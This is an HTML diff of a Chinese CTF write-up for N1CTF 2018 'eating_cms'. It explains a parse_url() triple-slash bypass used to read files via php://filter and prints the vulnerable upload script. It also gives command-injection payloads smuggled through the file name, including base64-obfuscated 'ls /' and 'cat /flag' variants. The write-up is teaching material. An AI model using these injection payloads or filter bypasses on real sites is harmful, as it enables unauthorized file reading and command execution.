@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -240,14 +248,14 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：8 个月前
+                  本文最后更新于：9 个月前
                 
               </p>
             
             <div class="markdown-body">
               <h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><h4 id="parse-url-解析漏洞"><a href="#parse-url-解析漏洞" class="headerlink" title="parse_url()解析漏洞"></a><code>parse_url()</code>解析漏洞</h4><ul>
 <li><p><code>function.php</code>中</p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_directory</span>(<span class="hljs-params"></span>)</span>
+<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_directory</span>(<span class="hljs-params"></span>)</span>
 <span class="hljs-function"></span>&#123;
     $keywords = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>];
     $uri = parse_url($_SERVER[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]);
@@ -264,7 +272,7 @@
                 hacker();
         &#125;
     &#125;
-&#125;</code></pre></div>
+&#125;</code></pre>
 
 <p><code>http://675a4ec5-c964-4b92-a667-7415df780f0f.node4.buuoj.cn/user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code></p>
 <p>这样就会被匹配到，不能读取；但是如果这样<code>///user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code>parse_url就会返回<code>false</code>；读取成功。</p>
@@ -272,7 +280,7 @@
 <p><strong>漏洞问题只存在于php5.4.7以前</strong></p>
 <hr>
 <p>真正的上传地址<code>http://675a4ec5-c964-4b92-a667-7415df780f0f.node4.buuoj.cn/user.php?page=m4aaannngggeee</code></p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-comment">//upllloadddd.php</span>
+<pre><code class="hljs php"><span class="hljs-comment">//upllloadddd.php</span>
 <span class="hljs-meta">&lt;?php</span>
 $allowtype = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>);
 $size = <span class="hljs-number">10000000</span>;
@@ -298,17 +306,17 @@ $ext = array_pop(explode(<span class="hljs-string">&quot;.&quot;</span>,$_FILES[
 <span class="hljs-keyword">if</span>(!in_array($ext,$allowtype))&#123;
     unlink($newfile);
 &#125;
-<span class="hljs-meta">?&gt;</span></code></pre></div>
+<span class="hljs-meta">?&gt;</span></code></pre>
 
 <p>payload：</p>
 <blockquote>
 <p><code>;cd ..;ls;#</code></p>
 <p><code>;cd ..;cat flag_233333;#</code></p>
 <p><strong><strong>****</strong></strong>或者*<strong><strong><strong><strong><strong>****</strong></strong></strong></strong></strong></p>
-<div class="hljs"><pre><code class="hljs php">|| `<span class="hljs-keyword">echo</span> bHMgLw== |base64 -d`
+<pre><code class="hljs php">|| `<span class="hljs-keyword">echo</span> bHMgLw== |base64 -d`
 		ls /
 || `<span class="hljs-keyword">echo</span> Y2F0IC9mbGFnXzIzMzMzMyA= |base64 -d`
- 	cat /flag_233333</code></pre></div>
+ 	cat /flag_233333</code></pre>
 </blockquote>
 </li>
 </ul>
@@ -469,6 +477,8 @@ $ext = array_pop(explode(<span class="hljs-string">&quot;.&quot;</span>,$_FILES[
 
 
 
+  
+    
   
 
 
